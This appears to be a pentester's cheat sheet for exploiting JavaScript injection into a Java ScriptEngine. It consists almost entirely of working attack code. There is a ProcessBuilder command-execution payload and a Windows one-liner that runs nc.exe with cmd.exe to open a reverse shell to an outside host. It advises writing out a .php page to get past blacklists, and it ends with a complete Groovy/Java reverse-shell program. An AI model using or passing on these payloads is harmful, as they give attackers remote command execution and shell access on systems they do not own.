
If you have injection on js that gets sent to java scriptengine, give this a go:
```
command = "echo /*"
pb = new java.lang.ProcessBuilder(["/bin/bash","-c", command])
pb.redirectOutput(new java.io.File("/tmp/test"))
pb.redirectError(new java.io.File("/tmp/test"))
pb.start()
```

Confirmed winning windows java script shell method:

```
eval('command = "c:/nc.exe XXXX 31337 -e cmd.exe"; pb = new java.lang.ProcessBuilder(["C:/Windows/System32/cmd.exe","/c", command]); pb.redirectOutput(new java.io.File("C:/XXXX/logs/output.txt")); pb.redirectError(new java.io.File("C:/XXXXX/logs/error.txt")); pb.start();');
```

If the scriptengine is sane, it will have certain calls/functions blacklisted. Look for alts to processbuilder, or use functions that do what you want to do (write out a .php page etc)



Groovy/Java reverse shell
https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
```
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
	while(pi.available()>0) so.write(pi.read());
	while(pe.available()>0) so.write(pe.read());
	while(si.available()>0) po.write(si.read());
	so.flush();
	po.flush();
	Thread.sleep(50);
	try {
		p.exitValue();
		break;
	}catch (Exception e){}
};
p.destroy();
s.close();
```
